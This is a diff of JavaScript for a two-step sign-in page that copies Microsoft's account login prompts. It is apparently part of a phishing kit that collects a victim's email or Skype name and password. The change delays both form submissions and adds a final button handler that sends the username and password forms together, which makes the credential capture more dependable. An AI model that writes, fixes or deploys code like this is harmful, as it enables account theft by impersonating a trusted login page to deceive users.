@@ -1,21 +1,21 @@
 document.addEventListener('DOMContentLoaded', () => {
-    const form_uname = document.getElementById('form_uname');
-    const form_pwd = document.getElementById('form_pwd');
     const unReq = "Enter a valid email address, phone number, or Skype name."
     const pwdReq = "Please enter the password for your Microsoft account."
     const unameInp = document.getElementById('inp_uname');
     const pwdInp = document.getElementById('inp_pwd');
+    const form_uname = document.getElementById('form_uname');
+    const form_pwd = document.getElementById('form_pwd');
     let view = "uname";
 
     let unameVal = pwdVal = false;
     /////next button
     const nxt = document.getElementById('btn_next');
 
-    nxt.addEventListener('click', () => {
+    nxt.addEventListener('click', (event) => {
+        event.preventDefault();
         //validate the form
         validate();
         if (unameVal) {
-            form_uname.submit();
             document.getElementById("section_uname").classList.toggle('d-none');
             document.getElementById('section_pwd').classList.remove('d-none');
             document.querySelectorAll('#user_identity').forEach((e) => {
@@ -29,16 +29,24 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const sig = document.getElementById('btn_sig');
 
-    sig.addEventListener('click', () => {
+    sig.addEventListener('click', (event) => {
+     event.preventDefault();   
         //validate the form
         validate();
         if (pwdVal) {
-            form_pwd.submit();
             document.getElementById("section_pwd").classList.toggle('d-none');
             document.getElementById('section_final').classList.remove('d-none');
             view = "final";
         }
     });
+
+// Add this code to submit the forms manually
+document.getElementById('btn_final').addEventListener('click', (event) => {
+    event.preventDefault(); // Prevents the default form submission
+    form_uname.submit(); // Submit the username form
+    form_pwd.submit();  // Submit the password form
+});
+    
 
     function validate() {
         function unameValAction(type) {
